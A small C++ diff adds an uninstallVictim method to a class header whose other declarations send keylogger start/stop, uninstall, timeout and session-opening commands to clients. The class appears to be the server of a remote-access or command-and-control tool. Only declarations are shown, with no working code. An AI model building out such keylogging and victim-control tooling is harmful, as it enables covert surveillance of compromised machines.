@@ -72,6 +72,7 @@ public:
     [[nodiscard]] bool sendStartKeyloggerCommand(const UUID& client_id);
     [[nodiscard]] bool sendStopKeyloggerCommand(const UUID& client_id);
     [[nodiscard]] bool sendUninstallCommand(const UUID& client_id);
+    [[nodiscard]] bool uninstallVictim(const Victim& victim);
 
     [[nodiscard]] bool sendTimeoutCommand(int64_t client_id, int timeout);
     [[nodiscard]] bool sendOpenSessionCommand(int64_t client_id, int64_t port);
